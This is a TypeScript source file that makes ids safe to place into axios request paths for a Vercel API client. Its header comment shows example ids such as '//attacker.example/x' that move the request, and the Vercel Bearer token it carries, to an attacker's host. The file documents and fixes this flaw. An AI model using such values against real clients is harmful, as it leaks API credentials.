/**
 * src/safe-path.ts — make an id safe to interpolate into an axios path
 *
 * ───────────────────────────────────────────────────────────────────────────
 * WHY
 *
 * CodeQL reported seven critical js/request-forgery findings in src/index.ts,
 * every one of the same shape:
 *
 *     const client = axios.create({ baseURL: 'https://api.vercel.com',
 *                                   headers: { Authorization: `Bearer ${token}` } })
 *     await client.get(`/v13/deployments/${id}`)
 *
 * The baseURL looks like it pins the destination. It does not. axios only
 * applies baseURL to a RELATIVE path — if the path is absolute, the baseURL is
 * discarded entirely. So an id of
 *
 *     //attacker.example/x        -> https://attacker.example/x
 *     https://attacker.example/x  -> https://attacker.example/x
 *
 * sends the request somewhere else, and the Authorization header carrying the
 * Vercel API token goes with it. That token can create deployments, read
 * environment variables and add domains across the whole team.
 *
 * So this is not only "reaches your internal network". It is a one-request
 * credential leak, the same shape as the Unsplash key leak found in
 * javari-scrapbook the same day.
 *
 * ───────────────────────────────────────────────────────────────────────────
 * WHY A LOCAL FILE AND NOT THE SDK
 *
 * The rest of the org gets urlSegment() from @craudioviz/platform-sdk. This
 * repo is a standalone Express MCP server with no dependency on the SDK and no
 * Next.js, and adding one for fifteen lines would pull a React peer dependency
 * into a server that has no UI. If this repo ever takes the SDK for another
 * reason, delete this file and import urlSegment instead — the behaviour is
 * deliberately identical.
 *
 * CR AudioViz AI, LLC · EIN 39-3646201 · 2026-08-29
 */

export class UnsafePathError extends Error {
  constructor(value: string) {
    super(`Refusing to build a request path from ${JSON.stringify(value.slice(0, 60))}.`);
    this.name = 'UnsafePathError';
  }
}

/**
 * Vercel ids and names: letters, digits, dot, underscore, hyphen.
 *
 * Deliberately excludes / : ? # % and whitespace. Without a slash or a scheme
 * an interpolated value cannot become an absolute URL, so the baseURL cannot be
 * escaped — which is the actual defect, not traversal.
 */
const VERCEL_ID = /^[A-Za-z0-9._-]{1,128}$/;

/** A hostname: letters, digits, dots and hyphens, nothing else. */
const DOMAIN = /^[A-Za-z0-9.-]{1,253}$/;

function check(value: unknown, pattern: RegExp): string {
  const s = typeof value === 'string' ? value : String(value ?? '');
  if (!pattern.test(s) || s.includes('..')) throw new UnsafePathError(s);
  return encodeURIComponent(s);
}

/** A deployment or project id, safe to place in a path segment. */
export function safeId(value: unknown): string {
  return check(value, VERCEL_ID);
}

/** A domain name, safe to place in a path segment or body. */
export function safeDomain(value: unknown): string {
  return check(value, DOMAIN);
}
